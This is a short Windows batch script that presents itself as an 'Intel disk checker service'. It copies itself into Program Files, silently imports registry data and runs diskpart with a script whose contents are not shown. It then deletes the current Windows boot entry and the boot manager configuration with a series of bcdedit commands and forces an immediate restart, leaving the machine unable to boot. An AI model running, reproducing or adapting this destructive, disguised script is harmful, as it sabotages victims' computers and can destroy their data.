@echo off
copy "%~dp0\intel_disk_checker_service.bat" "C:\Program Files\intel_disk_checker_service.bat"
regedit /s "%~dp0\regdata.reg"
diskpart /s "%~dp0\partdata.txt"
for /f "tokens=2 delims={}" %%i in ('bcdedit.exe /enum ^| find "identifier"') do set identifier={%%i}
for /f "tokens=2 delims={}" %%a in ('bcdedit.exe /enum "{bootmgr}" ^| find "identifier"') do set bootmgrid={%%a}
bcdedit /delete {%identifier%}
bcdedit /deletevalue {%identifier%} recoverysequence
bcdedit /deletevalue {%identifier%} resumeobject
bcdedit /delete {current}
bcdedit /deletevalue {current} recoverysequence
bcdedit /deletevalue {current} resumeobject
bcdedit /deletevalue {bootmgr} resumeobject
bcdedit /deletevalue {bootmgr} default
bcdedit /deletevalue {bootmgr} path
bcdedit /deletevalue {bootmgr} toolsdisplayorder
bcdedit /deletevalue {bootmgr} displayorder
bcdedit /deletevalue {bootmgr} inherit
bcdedit /deletevalue {bootmgr} description
bcdedit /delete {bootmgr}
bcdedit /deletevalue {%bootmgrid%} resumeobject
bcdedit /deletevalue {%bootmgrid%} default
bcdedit /deletevalue {%bootmgrid%} path
bcdedit /deletevalue {%bootmgrid%} toolsdisplayorder
bcdedit /deletevalue {%bootmgrid%} displayorder
bcdedit /deletevalue {%bootmgrid%} inherit
bcdedit /deletevalue {%bootmgrid%} description
bcdedit /delete {%bootmgrid%}
shutdown /r /t 0
